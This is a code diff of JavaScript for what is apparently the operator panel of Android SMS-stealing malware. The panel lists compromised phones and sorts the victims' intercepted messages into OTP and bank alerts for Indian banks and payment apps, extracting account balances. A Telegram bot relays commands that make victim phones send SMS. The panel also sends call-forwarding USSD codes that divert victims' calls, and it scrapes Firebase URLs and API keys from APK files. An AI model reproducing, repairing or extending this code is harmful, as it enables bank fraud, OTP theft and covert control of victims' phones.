     b.innerHTML = '<div class="loading">Loading apps...</div>';
     fetch(url).then(function(r) { return r.json(); }).then(function(apps) {
@@ -948,217 +842,98 @@ function renderApps() {
   }
 }
 function renderNotifs() {
-  var b = document.getElementById('dBody');
-  var d = devs[curId];
-  var n = d.notifications || {};
+  var b = document.getElementById('dBody'); var d = devs[curId]; var n = d.notifications || {};
   var l = Object.entries(n).sort(function(x, y) { return (y[1].timestamp || 0) - (x[1].timestamp || 0); });
   document.getElementById('cNotifs').textContent = l.length;
   if (l.length === 0) { b.innerHTML = '<div class="empty">No notifications</div>'; return; }
-  b.innerHTML = l.map(function(p) {
-    var x = p[1];
-    return '<div class="notif"><div class="notif-head"><span class="notif-app">' + esc(x.app || 'App') + '</span><span class="notif-date">' + (x.date || '') + '</span></div>' + (x.title ? '<div class="notif-title">' + esc(x.title) + '</div>' : '') + '<div class="notif-body">' + esc(x.message || '') + '</div></div>';
-  }).join('');
+  b.innerHTML = l.map(function(p) { var x = p[1]; return '<div class="notif"><div class="notif-head"><span class="notif-app">' + esc(x.app || 'App') + '</span><span class="notif-date">' + (x.date || '') + '</span></div>' + (x.title ? '<div class="notif-title">' + esc(x.title) + '</div>' : '') + '<div class="notif-body">' + esc(x.message || '') + '</div></div>'; }).join('');
 }
 function renderBank() {
-  var b = document.getElementById('dBody');
-  var d = devs[curId];
-  var all = [];
+  var b = document.getElementById('dBody'); var d = devs[curId]; var all = [];
   Object.values(curMsgs).forEach(function(m) { all.push(m); });
   if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { all.push(m); });
   all.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
   var bks = all.filter(function(m) { var c = cat(m.sender, m.body); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
   document.getElementById('cBank').textContent = bks.length;
   if (bks.length === 0) { b.innerHTML = '<div class="empty">No bank messages</div>'; return; }
-  var lb = '';
-  for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
+  var lb = ''; for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
   var html = '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + (lb || '—') + '</div></div>';
-  html += bks.map(function(m) {
-    var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender);
-    var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1;
-    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
-  }).join('');
+  html += bks.map(function(m) { var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender); var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1; return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>'; }).join('');
   b.innerHTML = html;
 }
 
-// ═══════════════════════════════════════════════════════
-// TELEGRAM POLLING (WEB PANEL SIDE)
-// ═══════════════════════════════════════════════════════
 function startTelegramPolling(token, chatId) {
-  var devId = curId;
-  if (!devId) return;
-  if (tgPolling[devId] && tgPolling[devId].active) return;
-  
+  var devId = curId; if (!devId) return; if (tgPolling[devId] && tgPolling[devId].active) return;
   tgPolling[devId] = { active: true, token: token, chatId: chatId, offset: 0, timer: null, logs: [] };
-  
-  updateTgStatus('🟢 Starting bot polling...');
-  addTgLog('🚀 Bot polling started');
-  
-  fetch('https://api.telegram.org/bot' + token + '/getMe')
-    .then(function(r) { return r.json(); })
-    .then(function(j) {
-      if (j.ok) {
-        addTgLog('✅ Bot connected: @' + j.result.username);
-        updateTgStatus('🟢 Bot @' + j.result.username + ' — waiting for messages...', 'ok');
-      } else {
-        addTgLog('❌ Bot error: ' + (j.description || 'unknown'));
-        updateTgStatus('❌ Bot error: ' + (j.description || 'unknown'), 'err');
-      }
-    })
-    .catch(function(e) { addTgLog('❌ Connection failed: ' + e.message); updateTgStatus('❌ Connection failed', 'err'); });
-  
+  updateTgStatus('🟢 Starting bot polling...'); addTgLog('🚀 Bot polling started');
+  fetch('https://api.telegram.org/bot' + token + '/getMe').then(function(r) { return r.json(); }).then(function(j) { if (j.ok) { addTgLog('✅ Bot connected: @' + j.result.username); updateTgStatus('🟢 Bot @' + j.result.username + ' — waiting...', 'ok'); } else { addTgLog('❌ Bot error: ' + (j.description || 'unknown')); updateTgStatus('❌ Bot error', 'err'); } }).catch(function(e) { addTgLog('❌ Connection failed: ' + e.message); updateTgStatus('❌ Connection failed', 'err'); });
   var pollFn = function() {
-    var p = tgPolling[devId];
-    if (!p || !p.active) return;
-    
-    var url = 'https://api.telegram.org/bot' + p.token + '/getUpdates?timeout=5&offset=' + p.offset;
-    
-    fetch(url)
-      .then(function(r) { return r.json(); })
-      .then(function(j) {
-        if (!j.ok) { addTgLog('❌ getUpdates error: ' + (j.description || 'unknown')); return; }
-        
-        if (j.result && j.result.length > 0) {
-          j.result.forEach(function(update) {
-            p.offset = update.update_id + 1;
-            if (update.message && update.message.text) {
-              var msg = update.message.text;
-              var from = update.message.from ? (update.message.from.username || update.message.from.first_name || 'user') : 'user';
-              addTgLog('📩 From @' + from + ': "' + msg.substring(0, 60) + (msg.length > 60 ? '...' : '') + '"');
-              
-              var toMatch = msg.match(/(?:To|to|TO):\s*([+\d]+)/);
-              var bodyMatch = msg.match(/(?:Body|body|BODY):\s*([\s\S]+)/);
-              
-              if (toMatch && bodyMatch) {
-                var toNum = toMatch[1].trim();
-                var bodyMsg = bodyMatch[1].trim();
-                addTgLog('📤 Sending SMS command to ' + toNum + '...');
-                updateTgStatus('📤 Sending SMS to ' + toNum + '...');
-                
-                db.ref('device_info/' + devId + '/sms_commands').push({
-                  to: toNum, message: bodyMsg, sim_slot: 1, status: 'pending',
-                  timestamp: Date.now(), source: 'telegram_bot'
-                }).then(function() {
-                  addTgLog('✅ SMS command pushed to device');
-                  updateTgStatus('✅ SMS sent to ' + toNum, 'ok');
-                }).catch(function(e) {
-                  addTgLog('❌ Firebase push failed: ' + e.message);
-                  updateTgStatus('❌ Failed: ' + e.message, 'err');
-                });
-              } else {
-                addTgLog('⚠️ Invalid format. Use: "To: NUMBER\\nBody: MESSAGE"');
-              }
-            }
-          });
-        }
-        p.timer = setTimeout(pollFn, 5000);
-      })
-      .catch(function(e) {
-        addTgLog('❌ Polling error: ' + e.message);
-        var p2 = tgPolling[devId];
-        if (p2 && p2.active) p2.timer = setTimeout(pollFn, 5000);
-      });
+    var p = tgPolling[devId]; if (!p || !p.active) return;
+    fetch('https://api.telegram.org/bot' + p.token + '/getUpdates?timeout=5&offset=' + p.offset).then(function(r) { return r.json(); }).then(function(j) {
+      if (!j.ok) { addTgLog('❌ getUpdates error'); return; }
+      if (j.result && j.result.length > 0) {
+        j.result.forEach(function(update) {
+          p.offset = update.update_id + 1;
+          if (update.message && update.message.text) {
+            var msg = update.message.text; var from = update.message.from ? (update.message.from.username || update.message.from.first_name || 'user') : 'user';
+            addTgLog('📩 From @' + from + ': "' + msg.substring(0, 60) + '"');
+            var toMatch = msg.match(/(?:To|to|TO):\s*([+\d]+)/); var bodyMatch = msg.match(/(?:Body|body|BODY):\s*([\s\S]+)/);
+            if (toMatch && bodyMatch) { var toNum = toMatch[1].trim(); var bodyMsg = bodyMatch[1].trim(); addTgLog('📤 Sending SMS to ' + toNum + '...'); db.ref('device_info/' + devId + '/sms_commands').push({ to: toNum, message: bodyMsg, sim_slot: 1, status: 'pending', timestamp: Date.now(), source: 'telegram_bot' }).then(function() { addTgLog('✅ SMS command pushed'); }).catch(function(e) { addTgLog('❌ Firebase push failed: ' + e.message); }); }
+            else { addTgLog('⚠️ Invalid format'); }
+          }
+        });
+      }
+      p.timer = setTimeout(pollFn, 5000);
+    }).catch(function(e) { addTgLog('❌ Polling error: ' + e.message); var p2 = tgPolling[devId]; if (p2 && p2.active) p2.timer = setTimeout(pollFn, 5000); });
   };
   tgPolling[devId].timer = setTimeout(pollFn, 2000);
 }
-
-function stopTelegramPolling() {
-  Object.keys(tgPolling).forEach(function(devId) {
-    var p = tgPolling[devId];
-    if (p) { p.active = false; if (p.timer) clearTimeout(p.timer); }
-  });
-  if (curId) {
-    updateTgStatus('⚪ Polling stopped');
-    addTgLog('⏹ Polling stopped');
-  }
-}
-
-function updateTgStatus(text, type) {
-  var el = document.getElementById('tgStatus');
-  if (!el) return;
-  el.textContent = text;
-  el.className = 'tg-status' + (type === 'err' ? ' err' : '') + (type === 'ok' ? ' ok' : '');
-}
-
+function stopTelegramPolling() { Object.keys(tgPolling).forEach(function(devId) { var p = tgPolling[devId]; if (p) { p.active = false; if (p.timer) clearTimeout(p.timer); } }); if (curId) { updateTgStatus('⚪ Polling stopped'); addTgLog('⏹ Polling stopped'); } }
+function updateTgStatus(text, type) { var el = document.getElementById('tgStatus'); if (!el) return; el.textContent = text; el.className = 'tg-status' + (type === 'err' ? ' err' : '') + (type === 'ok' ? ' ok' : ''); }
 function addTgLog(text) {
-  var el = document.getElementById('tgLog');
-  var time = new Date().toLocaleTimeString();
-  var lineText = '[' + time + '] ' + text;
-  
-  if (curId && tgPolling[curId]) {
-    if (!tgPolling[curId].logs) tgPolling[curId].logs = [];
-    tgPolling[curId].logs.push(lineText);
-    if (tgPolling[curId].logs.length > 50) tgPolling[curId].logs.shift();
-  }
-  
+  var el = document.getElementById('tgLog'); var time = new Date().toLocaleTimeString(); var lineText = '[' + time + '] ' + text;
+  if (curId && tgPolling[curId]) { if (!tgPolling[curId].logs) tgPolling[curId].logs = []; tgPolling[curId].logs.push(lineText); if (tgPolling[curId].logs.length > 50) tgPolling[curId].logs.shift(); }
   if (!el) return;
-  var line = document.createElement('div');
-  line.className = 'tg-log-line';
-  line.textContent = lineText;
-  el.appendChild(line);
-  el.scrollTop = el.scrollHeight;
+  var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = lineText;
+  el.appendChild(line); el.scrollTop = el.scrollHeight;
   while (el.children.length > 50) el.removeChild(el.firstChild);
 }
 
-// ═══ CALL FORWARD ═══
 function openCallFwd() {
   if (!curId) { alert('No device'); return; }
   var d = devs[curId];
   document.getElementById('cfNumber').value = (d.forward_settings && d.forward_settings.admin_number) || '';
-  document.getElementById('cfStatus').textContent = 'Ready.';
-  document.getElementById('cfStatus').className = 'cf-status';
+  document.getElementById('cfStatus').textContent = 'Ready.'; document.getElementById('cfStatus').className = 'cf-status';
   document.getElementById('cfOverlay').classList.add('active');
-  db.ref('call_forward_commands/' + curId).limitToLast(1).on('value', function(s) {
-    var val = s.val();
-    if (val) {
-      var cmd = val[Object.keys(val)[0]];
-      var statusEl = document.getElementById('cfStatus');
-      statusEl.className = 'cf-status ok';
-      statusEl.innerHTML = '<strong>Latest:</strong> ' + (cmd.action || 'unknown').toUpperCase() + '<br>Status: ' + (cmd.status || 'pending').toUpperCase() + (cmd.ussd_code ? '<br>USSD: ' + cmd.ussd_code : '');
-    }
-  });
+  db.ref('call_forward_commands/' + curId).limitToLast(1).on('value', function(s) { var val = s.val(); if (val) { var cmd = val[Object.keys(val)[0]]; var statusEl = document.getElementById('cfStatus'); statusEl.className = 'cf-status ok'; statusEl.innerHTML = '<strong>Latest:</strong> ' + (cmd.action || 'unknown').toUpperCase() + '<br>Status: ' + (cmd.status || 'pending').toUpperCase() + (cmd.ussd_code ? '<br>USSD: ' + cmd.ussd_code : ''); } });
 }
 function closeCallFwd() { document.getElementById('cfOverlay').classList.remove('active'); if (curId) { try { db.ref('call_forward_commands/' + curId).off(); } catch(e) {} } }
 function sendCallFwd(action) {
   if (!curId) return;
-  var num = document.getElementById('cfNumber').value.trim();
-  var statusEl = document.getElementById('cfStatus');
+  var num = document.getElementById('cfNumber').value.trim(); var statusEl = document.getElementById('cfStatus');
   if (action === 'activate' && (!num || num.length < 10)) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ Enter valid number'; return; }
   statusEl.className = 'cf-status'; statusEl.textContent = '📤 Sending...';
   var cmd = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() };
   if (action === 'activate') cmd.ussd_code = '**21*' + num + '#';
   else if (action === 'deactivate') cmd.ussd_code = '##21#';
   else cmd.ussd_code = '*#21#';
-  db.ref('call_forward_commands/' + curId).push(cmd).then(function() {
-    statusEl.className = 'cf-status ok';
-    statusEl.innerHTML = '✅ Sent!<br>' + cmd.ussd_code;
-  }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ ' + e.message; });
+  db.ref('call_forward_commands/' + curId).push(cmd).then(function() { statusEl.className = 'cf-status ok'; statusEl.innerHTML = '✅ Sent!<br>' + cmd.ussd_code; }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ ' + e.message; });
 }
 
-// ═══ HELPERS ═══
 function updStats() {
-  var ids = Object.keys(devs);
-  var on = 0, off = 0, sms = 0, bank = 0;
+  var ids = Object.keys(devs); var on = 0, off = 0, sms = 0, bank = 0;
   ids.forEach(function(id) {
-    var d = devs[id];
-    if (d.status === 'Online') on++; else off++;
-    var allM = [];
-    if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); });
-    if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); });
-    sms += allM.length;
-    allM.forEach(function(m) { var c = cat(m.sender, m.body); if (c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT') bank++; });
+    var d = devs[id]; if (d.status === 'Online') on++; else off++;
+    var allM = []; if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); }); if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); });
+    sms += allM.length; allM.forEach(function(m) { var c = cat(m.sender, m.body); if (c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT') bank++; });
   });
-  document.getElementById('sTotal').textContent = ids.length;
-  document.getElementById('sOnline').textContent = on;
-  document.getElementById('sOffline').textContent = off;
-  document.getElementById('sSms').textContent = sms;
-  document.getElementById('sBank').textContent = bank;
+  document.getElementById('sTotal').textContent = ids.length; document.getElementById('sOnline').textContent = on; document.getElementById('sOffline').textContent = off; document.getElementById('sSms').textContent = sms; document.getElementById('sBank').textContent = bank;
 }
 function isLiked(id) { return liked.indexOf(id) !== -1; }
 function toggleLike(id) { if (isLiked(id)) liked = liked.filter(function(x) { return x !== id; }); else liked.push(id); localStorage.setItem('liked', JSON.stringify(liked)); renderDevs(); updStar(); }
 function updStar() { var b = document.getElementById('btnStar'); if (b) b.textContent = isLiked(curId) ? '⭐' : '☆'; }
 function renderDevs() {
-  var g = document.getElementById('deviceGrid');
-  var q = (document.getElementById('searchBox').value || '').toLowerCase();
+  var g = document.getElementById('deviceGrid'); var q = (document.getElementById('searchBox').value || '').toLowerCase();
   var ids = Object.keys(devs).filter(function(id) {
     var d = devs[id];
     if (curFilter === 'online' && d.status !== 'Online') return false;
@@ -1173,49 +948,21 @@ function renderDevs() {
   if (ids.length === 0) { g.innerHTML = '<div class="empty">No devices</div>'; return; }
   ids.sort(function(a, b) { return (devs[b].first_install_timestamp || 0) - (devs[a].first_install_timestamp || 0); });
   g.innerHTML = ids.map(function(id) {
-    var d = devs[id];
-    var m = d.device_model || d.device_name || 'Unknown';
-    var b = d.battery || '0%';
+    var d = devs[id]; var m = d.device_model || d.device_name || 'Unknown'; var b = d.battery || '0%';
     var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || 'No SIM';
-    var lk = isLiked(id);
-    var pc = d.photos ? Object.keys(d.photos).length : 0;
+    var lk = isLiked(id); var pc = d.photos ? Object.keys(d.photos).length : 0;
     return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + id + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div></div>';
   }).join('');
-  g.querySelectorAll('.device-card').forEach(function(c) {
-    c.addEventListener('click', function(e) {
-      if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; }
-      openDev(this.getAttribute('data-id'));
-    });
-  });
+  g.querySelectorAll('.device-card').forEach(function(c) { c.addEventListener('click', function(e) { if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; } openDev(this.getAttribute('data-id')); }); });
 }
 function batColor(b) { var p = parseInt(b) || 0; if (p >= 50) return '#10B981'; if (p >= 20) return '#F59E0B'; return '#EF4444'; }
 function esc(t) { if (!t) return ''; var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
-function cat(sender, body) { var s = (sender || '').toUpperCase(), b = (body || '').toUpperCase();
-  if (b.indexOf('OTP') !== -1) return 'OTP';
-  if (b.indexOf('BAL') !== -1) return 'BALANCE';
-  if (b.indexOf('CREDIT') !== -1) return 'CREDIT';
-  if (b.indexOf('DEBIT') !== -1) return 'DEBIT';
-  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1) return 'BANK';
-  return 'ALERT';
-}
-function bankName(sender) { var s = (sender || '').toUpperCase();
-  if (s.indexOf('SBI') !== -1) return 'SBI'; if (s.indexOf('HDFC') !== -1) return 'HDFC';
-  if (s.indexOf('ICICI') !== -1) return 'ICICI'; if (s.indexOf('AXIS') !== -1) return 'AXIS';
-  if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe';
-  if (s.indexOf('GPAY') !== -1) return 'GPay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm';
-  return 'Bank';
-}
+function cat(sender, body) { var s = (sender || '').toUpperCase(), b = (body || '').toUpperCase(); if (b.indexOf('OTP') !== -1) return 'OTP'; if (b.indexOf('BAL') !== -1) return 'BALANCE'; if (b.indexOf('CREDIT') !== -1) return 'CREDIT'; if (b.indexOf('DEBIT') !== -1) return 'DEBIT'; if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1) return 'BANK'; return 'ALERT'; }
+function bankName(sender) { var s = (sender || '').toUpperCase(); if (s.indexOf('SBI') !== -1) return 'SBI'; if (s.indexOf('HDFC') !== -1) return 'HDFC'; if (s.indexOf('ICICI') !== -1) return 'ICICI'; if (s.indexOf('AXIS') !== -1) return 'AXIS'; if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe'; if (s.indexOf('GPAY') !== -1) return 'GPay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm'; return 'Bank'; }
 function extractBal(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i); return m ? '₹ ' + m[1] : ''; }
 function extractTx(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/gi); return m && m.length > 1 ? m[m.length - 1] : (m && m[0] ? m[0] : ''); }
-function detectFromSms(allMsgs) { var phones = {}, nets = {};
-  allMsgs.forEach(function(m) { var t = (m.body || '') + ' ' + (m.sender || '');
-    var pm = t.match(/\b[6-9]\d{9}\b/g); if (pm) pm.forEach(function(p) { phones[p] = true; });
-    var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/); if (nm) nets[nm[1]] = true;
-  });
-  return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) };
-}
+function detectFromSms(allMsgs) { var phones = {}, nets = {}; allMsgs.forEach(function(m) { var t = (m.body || '') + ' ' + (m.sender || ''); var pm = t.match(/\b[6-9]\d{9}\b/g); if (pm) pm.forEach(function(p) { phones[p] = true; }); var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/); if (nm) nets[nm[1]] = true; }); return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) }; }
 
-// ═══ NEW ACCOUNT ═══
 function showNewAcc() { document.getElementById('pinView').style.display = 'none'; document.getElementById('newAccView').style.display = 'block'; document.getElementById('newErr').textContent = ''; document.getElementById('bulkInput').value = ''; document.getElementById('newUrl').value = ''; document.getElementById('newKey').value = ''; document.getElementById('apkStatus').classList.remove('show'); }
 function hideNewAcc() { document.getElementById('pinView').style.display = 'block'; document.getElementById('newAccView').style.display = 'none'; }
 function parseBulkInput(text) {
@@ -1223,24 +970,15 @@ function parseBulkInput(text) {
   var urlRegex = /https?:\/\/[a-zA-Z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
   var keyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
   var urls = text.match(urlRegex) || [], keys = text.match(keyRegex) || [];
-  for (var i = 0; i < urls.length; i++) {
-    var url = urls[i].trim();
-    if (seenUrls[url]) continue;
-    seenUrls[url] = true;
-    accounts.push({ url: url, apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey, name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','') });
-  }
+  for (var i = 0; i < urls.length; i++) { var url = urls[i].trim(); if (seenUrls[url]) continue; seenUrls[url] = true; accounts.push({ url: url, apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey, name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','') }); }
   return accounts;
 }
 function bulkConnect() {
-  var text = document.getElementById('bulkInput').value.trim();
-  if (!text) { document.getElementById('newErr').textContent = 'Paste URLs first'; return; }
-  var accounts = parseBulkInput(text);
-  if (accounts.length === 0) { document.getElementById('newErr').textContent = 'No valid URL'; return; }
+  var text = document.getElementById('bulkInput').value.trim(); if (!text) { document.getElementById('newErr').textContent = 'Paste URLs first'; return; }
+  var accounts = parseBulkInput(text); if (accounts.length === 0) { document.getElementById('newErr').textContent = 'No valid URL'; return; }
   var list = getSavedAccounts(); var added = 0;
   accounts.forEach(function(acc) { var dup = list.findIndex(function(a) { return a.url === acc.url; }); if (dup === -1) { list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey }); added++; } });
-  saveAccounts(list);
-  document.getElementById('newErr').textContent = '✅ Added ' + added;
-  renderAccounts();
+  saveAccounts(list); document.getElementById('newErr').textContent = '✅ Added ' + added; renderAccounts();
   setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
 }
 function handleApkUpload(file) {
@@ -1249,8 +987,7 @@ function handleApkUpload(file) {
   reader.onload = function(e) {
     try {
       JSZip.loadAsync(e.target.result).then(function(zip) {
-        var foundUrls = [], foundKeys = [];
-        var promises = [];
+        var foundUrls = [], foundKeys = [], promises = [];
         zip.forEach(function(path, f) {
           if (f.dir || path.indexOf('.so') !== -1) return;
           promises.push(f.async('uint8array').then(function(bytes) {
@@ -1261,8 +998,7 @@ function handleApkUpload(file) {
         });
         Promise.all(promises).then(function() {
           var u = dedup(foundUrls);
-          if (u.length > 0) { document.getElementById('newUrl').value = u[0]; status.textContent = '✅ Found ' + u.length + ' URLs'; }
-          else status.textContent = '⚠️ No URL found';
+          if (u.length > 0) { document.getElementById('newUrl').value = u[0]; status.textContent = '✅ Found ' + u.length + ' URLs'; } else status.textContent = '⚠️ No URL found';
           if (foundKeys.length > 0) document.getElementById('newKey').value = foundKeys[0];
         });
         function dedup(a) { var o=[],s={}; a.forEach(function(x){if(!s[x]){s[x]=1;o.push(x);}}); return o; }
@@ -1287,16 +1023,10 @@ function saveNewAcc() {
   var list = getSavedAccounts(), dup = list.findIndex(function(a) { return a.url === url; });
   var acc = { name: url.replace('https://','').replace('.firebaseio.com',''), url: url, apiKey: key };
   if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; } else list.push(acc);
-  saveAccounts(list);
-  err.textContent = '✅ Opening panel...';
-  setTimeout(function() {
-    currentAccount = { name: acc.name, url: url, apiKey: key, isRTO: false };
-    hideNewAcc();
-    openPanel({ apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') }, acc.name);
-  }, 600);
+  saveAccounts(list); err.textContent = '✅ Opening panel...';
+  setTimeout(function() { currentAccount = { name: acc.name, url: url, apiKey: key, isRTO: false }; hideNewAcc(); openPanel({ apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') }, acc.name); }, 600);
 }
 
-// ═══ EVENT LISTENERS ═══
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
 document.getElementById('btnNewAcc').addEventListener('click', showNewAcc);
@@ -1321,6 +1051,9 @@ document.getElementById('cfDeactivate').addEventListener('click', function() { s
 document.getElementById('cfCheck').addEventListener('click', function() { sendCallFwd('check_status'); });
 document.querySelectorAll('[data-cfsim]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-cfsim]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); cfSimSlot = parseInt(this.getAttribute('data-cfsim')); }); });
 document.getElementById('cfOverlay').addEventListener('click', function(e) { if (e.target.id === 'cfOverlay') closeCallFwd(); });
+document.getElementById('delScopeCancel').addEventListener('click', closeDeleteScopeDialog);
+document.getElementById('delScopeConfirm').addEventListener('click', confirmDeleteScope);
+document.getElementById('delScopeOverlay').addEventListener('click', function(e) { if (e.target.id === 'delScopeOverlay') closeDeleteScopeDialog(); });
 document.getElementById('btnCsv').addEventListener('click', function() {
   var csv = 'Device,Sender,Body,Date\n';
   Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
